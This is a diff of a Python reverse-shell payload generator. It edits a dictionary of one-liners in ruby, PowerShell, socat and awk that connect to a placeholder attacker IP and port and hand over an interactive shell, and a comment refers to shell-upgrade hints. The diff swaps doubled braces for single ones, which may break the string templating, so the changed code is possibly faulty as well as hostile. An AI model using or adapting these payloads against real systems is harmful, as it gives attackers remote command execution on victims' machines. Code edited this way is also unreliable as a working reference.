@@ -36,17 +36,17 @@ _PAYLOADS: dict[str, str] = {
     "ruby":         ("ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;"
                      "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
     "powershell":   ("powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient("
-                     "'{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
-                     "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
+                     "'{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
+                     "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
                      "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
                      "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
                      "$sb=([text.encoding]::ASCII).GetBytes($r2);"
-                     "$s.Write($sb,0,$sb.Length);$s.Flush()}}\""),
+                     "$s.Write($sb,0,$sb.Length);$s.Flush()}\""),
     "socat":        "socat TCP:{ip}:{port} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
-    "awk":          ("awk 'BEGIN{{s=\"/inet/tcp/0/{ip}/{port}\";"
-                     "while(42){{do{{printf \"shell> \"|&s;s|&getline c;"
-                     "if(c){{while((c|&getline)>0)print $0|&s;close(c)}}}}while(c!=\"exit\")"
-                     "close(s)}}}}' /dev/null"),
+    "awk":          ("awk 'BEGIN{s=\"/inet/tcp/0/{ip}/{port}\";"
+                     "while(42){do{printf \"shell> \"|&s;s|&getline c;"
+                     "if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!=\"exit\")"
+                     "close(s)}}' /dev/null"),
 }
 
 # 쉘 안정화(업그레이드) 힌트
